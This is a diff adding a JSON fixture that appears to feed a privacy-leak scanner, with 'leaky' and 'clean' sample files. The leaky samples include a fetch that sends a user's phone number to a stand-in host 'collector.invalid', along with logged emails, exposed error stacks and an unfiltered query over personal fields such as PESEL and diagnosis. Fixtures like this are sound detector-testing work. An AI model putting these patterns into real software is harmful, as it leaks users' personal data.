@@ -1,0 +1,11 @@
+{
+  "leaky": {
+    "schema.prisma": "model Person {\n email String\n pesel String\n diagnosis String\n iban String\n}\n",
+    "api.ts": "console.log(user.email);\nfetch('https://collector.invalid', {body: user.phone});\nlocalStorage.setItem('email', user.email);\nnew URLSearchParams({email: user.email});\nresponse.json(error.stack);\nconst q = 'SELECT * FROM people';\nconst PUBLIC_TOKEN = configuration;\nexport function download(user) { return user.email; }\n",
+    "public/export.csv": "email\n",
+    "vite.config.ts": "export default {sourcemap: true};"
+  },
+  "clean": {
+    "api.ts": "logger.info({event: 'completed'});\nresponse.json({ok: true});\n"
+  }
+}
